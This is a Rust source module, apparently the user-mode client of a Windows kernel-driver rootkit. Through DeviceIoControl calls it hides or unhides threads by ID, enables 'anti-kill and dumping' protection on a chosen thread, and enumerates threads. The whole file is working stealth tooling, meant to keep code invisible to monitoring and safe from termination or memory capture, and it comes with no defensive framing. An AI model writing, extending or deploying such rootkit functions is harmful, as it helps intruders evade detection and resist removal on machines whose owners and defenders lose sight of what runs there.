use {
    crate::utils::{open_driver, Options},
    log::*,
    common::{
        structs::TargetThread,
        vars::MAX_TID,
    },
    std::{ffi::c_void, mem::size_of, ptr::null_mut},
    windows_sys::Win32::{
        Foundation::{CloseHandle, HANDLE}, 
        System::IO::DeviceIoControl
    },
};

pub struct Thread {
    driver_handle: HANDLE,
}

impl Thread {
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Error");
        Thread { driver_handle }
    }

    pub fn hide_unhide_thread(self, tid: Option<&u32>, ioctl_code: u32, enable: bool) {
        debug!("Attempting to open the driver for hide/unhide operation");    
        if let Some(tid_value) = tid {
            debug!("Preparing structure for TID: {}", tid_value);
            let mut return_buffer = 0;
            let tid = *tid_value as usize;
            let mut target_thread = TargetThread { tid, enable, ..Default::default() };
    
            debug!("Sending DeviceIoControl command to {} thread", if enable { "hide" } else { "unhide" });
            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_thread as *mut _ as *mut c_void,
                    size_of::<TargetThread>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };
    
            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", status);
            } else {
                info!("Thread with TID {} successfully {}hidden", tid, if enable { "" } else { "un" });
            }
        } else {
            error!("TID not supplied");
        }
    }
    
    #[cfg(not(feature = "mapper"))]
    pub fn protection_thread(self, tid: Option<&u32>, ioctl_code: u32, enable: bool) {
        debug!("Attempting to open the driver for thread protection operation");
        if let Some(tid_value) = tid {
            debug!("Preparing structure for TID: {}", tid_value);
            let mut return_buffer = 0;
            let tid = *tid_value as usize;
            let mut target_thread = TargetThread { tid, enable, ..Default::default() };
    
            debug!("Sending DeviceIoControl command to {} thread protection", if enable { "enable" } else { "disable" });
            let status = unsafe {
                DeviceIoControl(
                    self.driver_handle,
                    ioctl_code,
                    &mut target_thread as *mut _ as *mut c_void,
                    size_of::<TargetThread>() as u32,
                    null_mut(),
                    0,
                    &mut return_buffer,
                    null_mut(),
                )
            };
    
            if status == 0 {
                error!("DeviceIoControl Failed with status: 0x{:08X}", status);
            } else {
                info!("Thread TID {tid} with anti-kill and dumping functions {}", if enable { "enabled" } else { "disabled" });
            }
        } else {
            error!("TID not supplied");
        }
    }
    
    pub fn enumerate_thread(self, ioctl_code: u32, option: &Options) {
        debug!("Attempting to open the driver for thread enumeration");
        let mut info_thread: [TargetThread; MAX_TID] = unsafe { std::mem::zeroed() };
        let mut enumeration_input = TargetThread {
            options: option.to_shared(),
            ..Default::default()
        };
    
        debug!("Sending DeviceIoControl command to enumerate threads");
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut enumeration_input as *mut _ as *mut c_void,
                size_of::<TargetThread>() as u32,
                info_thread.as_mut_ptr() as *mut _,
                (info_thread.len() * size_of::<TargetThread>()) as u32,
                &mut return_buffer,
                null_mut(),
            )
        };
    
        if status == 0 {
            error!("DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            let total_threads = return_buffer as usize / size_of::<TargetThread>();
            info!("Total Threads: {}", total_threads);
            for (i, thread) in info_thread.iter().enumerate().take(total_threads) {
                if thread.tid > 0 {
                    info!("[{}] {}", i, info_thread[i].tid);
                }
            }
        }
    }
    
}

impl Drop for Thread {
    fn drop(&mut self) {
        debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
